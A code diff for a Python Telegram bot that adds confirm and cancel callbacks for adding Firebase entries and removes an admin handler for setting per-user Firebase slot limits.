-                except Exception:
-                    pass
-                bot.send_message(user_id, f"✅ Max slots for <code>{target_id}</code> "
-                                          f"set to <b>{word}</b>.")
-                send_admin_user_detail(user_id, None, target_id)
-                return
-
     # ---- 4. Fallback ----
     bot.reply_to(message,
                  f"❓ Please use the menu buttons below.\n"
@@ -3186,6 +3223,24 @@ def handle_callback(call):
     if data == "add_firebase":
         start_add_firebase(chat_id, message_id)
         bot.answer_callback_query(call.id)
+        return
+
+    # ─────────── ADD FIREBASE: confirmation (Add All / Cancel) ───────────
+    if data == "fb_add_confirm":
+        with _state_lock:
+            conf = firebase_confirmations.get(user_id)
+        if not conf:
+            bot.answer_callback_query(call.id,
+                                      "❌ No pending confirmation. Start over with "
+                                      "📁 ADD FIREBASE.", show_alert=True)
+            return
+        confirm_firebase_add(chat_id, message_id)
+        bot.answer_callback_query(call.id, "✅ Added! Scanning starts...", show_alert=False)
+        return
+
+    if data == "fb_add_cancel":
+        cancel_firebase_add(user_id)
+        bot.answer_callback_query(call.id, "❌ Cancelled - nothing was added.")
         return
 
     # ─────────── MY FIREBASE: pagination / select / delete ───────────
@@ -3311,30 +3366,6 @@ def handle_admin_callback(call, chat_id, message_id, data):
         except ValueError:
             return
         confirm_admin_delete_firebase(chat_id, message_id, fb_id)
-        return
-
-    # ─────────── SET MAX SLOTS (numeric) ───────────
-    if data.startswith("admin_maxslots_"):
-        try:
-            target = int(data.split("_")[-1])
-        except ValueError:
-            return
-        u = get_user(target)
-        if not u:
-            bot.answer_callback_query(call.id, "❌ User not found.", show_alert=True)
-            return
-        with _state_lock:
-            admin_states[user_id] = {"type": "set_max_slots", "target": target}
-        bot.send_message(
-            chat_id,
-            f"🎚️ Enter the <b>max Firebase slots</b> for user <code>{target}</code>:\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"• <b>-1</b> = auto (referral count)\n"
-            f"• <b>0</b> = blocked (no slots)\n"
-            f"• <b>N</b> = hard limit of N panels\n"
-            f"• <b>9999</b> = ∞ (effectively unlimited)\n"
-            f"(integer only, /cancel to abort)",
-        )
         return
 
     # ─────────── Add / remove points (amount entry) ───────────
